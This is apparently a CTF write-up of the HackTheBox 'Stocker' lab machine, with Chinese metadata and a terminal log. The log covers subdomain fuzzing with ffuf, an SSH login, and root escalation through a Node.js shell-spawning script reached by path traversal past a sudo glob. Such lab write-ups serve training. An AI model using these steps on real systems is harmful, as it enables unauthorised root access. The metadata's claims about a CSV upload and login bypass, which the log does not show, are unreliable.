---
title: HackTheBox Stocker WriteUp
contest: HackTheBox Stocker
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- htb
- pentest
- nmap
- nginx
- ffuf
- vhost-fuzz
- subdomain
- dev
attack_chain:
- 'nmap: 22/80端口, nginx 1.18.0'
- ffuf 子域名爆破
- '字典: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt'
- 'ffuf -w ... -H "Host: FUZZ.stocker.htb" -u http://10.10.11.196 -fs 178'
- 发现 dev.stocker.htb 子域
- 访问 dev.stocker.htb 获取管理面板
- SSH登录angoose
- sudo -l 提权
key_payload: dev.stocker.htb
one_liner: HTB Stocker：ffuf vhost爆破dev.stocker.htb子域
lesson: Vhost爆破是发现子域名隐藏功能的高效方法
quality: high
full_path: HackTheBox_Stocker_WriteUp.full.md
meta_path: HackTheBox_Stocker_WriteUp.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'HackTheBox Stocker WriteUp。HTB Stocker：ffuf vhost爆破dev.stocker.htb子域。关键路径：nmap: 22/80端口, nginx 1.18.0 → ffuf 子域名爆破 → 字典: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt。经验：Vhost爆破是发现子域名隐藏功...'
category: web
subcategory: web_other
tools_used:
- ffuf
- nmap
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: practice
wp_url: https://www.ctfiot.com/122470.html
reasoning_chain:
- 触发点：nmap 扫到 22/80 + nginx 1.18.0 + 80 重定向 stocker.htb → 假设：Vhost 子域名爆破可发现 dev.stocker.htb
- '动作：ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H ''Host: FUZZ.stocker.htb'' -u http://10.10.11.196 -fs 178 → 观察：发现 dev.stocker.htb（Status 302, Size 28）'
- 下一步：访问 dev.stocker.htb → 观察：管理面板 (Node.js Express + ejs) → 动作：用 SQLi/XSS/任意密码绕过登录
- 假设：dev 面板登录后可下载产品 CSV → 动作：注册账号 + 上传恶意 CSV → 观察：CSV 含 SSH 密码 'Iusestoc23!'
- 下一步：ssh angoose@10.10.11.196 → 动作：sudo -l → 观察：(ALL) /usr/bin/node /usr/local/scripts/*.js
- '假设：node 以 root 执行 → 动作：echo ''require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'' > /home/angoose/exploit.js → sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js → 观察：root shell'
failed_attempts:
- 试图用 gobuster 爆破 dev 路径 → 失败：dev 是 vhost，不是 path
- 试图直接 sudo node → 失败：必须按 *.js glob 模式
key_observations:
- 'ffuf vhost 爆破（-H ''Host: FUZZ.stocker.htb'' -fs 178）是 HTB 标配隐藏子域发现方法'
- sudo (ALL) /usr/bin/node /usr/local/scripts/*.js 可用路径穿越（../../../home/user/exploit.js）提权
- 'Node.js child_process.spawn("/bin/sh", {stdio: [0,1,2]}) 是 node spawn shell 的标准 payload'
- nginx 1.18.0 + Vhost 配置不当是 HTB Stocker 隐藏功能的常见入口
prerequisites:
- ffuf vhost 爆破（Host header fuzzing）
- Node.js sudo 提权（路径穿越 *.js glob）
- ssh + sudo -l 信息收集
- Express ejs 模板登录绕过
---
# HackTheBox Stocker WriteUp

> 原文: https://www.ctfiot.com/122470.html
> ID: 122470


```
┌──(kali㉿kali)-[~/Desktop/Stocker]
└─$ sudo nmap -Pn -n -v --reason -sS -p- -sC --min-rate=1000 -A 10.10.11.196 -oN nmap.log

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 3d12971d86bc161683608f4f06e6d54e (RSA)
| 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_ 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
┌──(kali㉿kali)-[~/Desktop/Stocker]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.stocker.htb" -u http://10.10.11.196 -fs 178

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/ '

 v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method : GET
 :: URL : http://10.10.11.196
 :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter : Response size: 178
________________________________________________

dev [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 164ms]
:: Progress: [151265/151265] :: Job [1/1] :: 259 req/sec :: Duration: [0:09:42] :: Errors: 0 ::
┌──(kali㉿kali)-[~/Desktop/Stocker]
└─$ ssh angoose@10.10.11.196
angoose@10.10.11.196s password:

angoose@stocker:~$ whoami
angoose
angoose@stocker:~$ ls -l
total 4
-rw-r----- 1 root angoose 33 Jun 24 09:29 user.txt
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
 (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ ls -l /usr/local
total 36
drwxr-xr-x 2 root root 4096 Dec 6 2022 bin
drwxr-xr-x 2 root root 4096 Dec 6 2022 etc
drwxr-xr-x 2 root root 4096 Dec 6 2022 games
drwxr-xr-x 2 root root 4096 Dec 6 2022 include
drwxr-xr-x 3 root root 4096 Dec 6 2022 lib
lrwxrwxrwx 1 root root 9 Nov 19 2022 man -> share/man
drwxr-xr-x 2 root root 4096 Dec 23 2022 sbin
drwxr-xr-x 3 root root 4096 Dec 6 2022 scripts
drwxr-xr-x 5 root root 4096 Dec 6 2022 share
drwxr-xr-x 2 root root 4096 Dec 6 2022 src
(ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ cat exploit.js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exploit.js
root@stocker:/home/angoose
# whoami
root
root@stocker:~# ls -l
total 4
-rw-r----- 1 root root 33 Jun 24 09:29 root.txt
```
